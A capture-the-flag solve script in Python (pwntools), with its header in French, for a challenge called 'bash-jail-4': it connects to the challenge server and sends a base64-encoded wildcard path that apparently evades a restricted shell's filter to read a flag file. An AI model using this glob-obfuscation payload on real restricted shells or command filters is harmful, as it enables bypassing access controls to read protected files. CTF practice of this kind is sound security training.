# bash-jail-4 — Pwny-CTF (script de solve)
from pwn import *

HOST, PORT = "chal.sigpwny.com", 5008
context.log_level = "debug"

io = remote(HOST, PORT)

io.recv()

payload = b64e(b"/???/??n/????32 /????????")
io.sendline(payload)

res = io.recv()
log.success(res)

io.interactive()


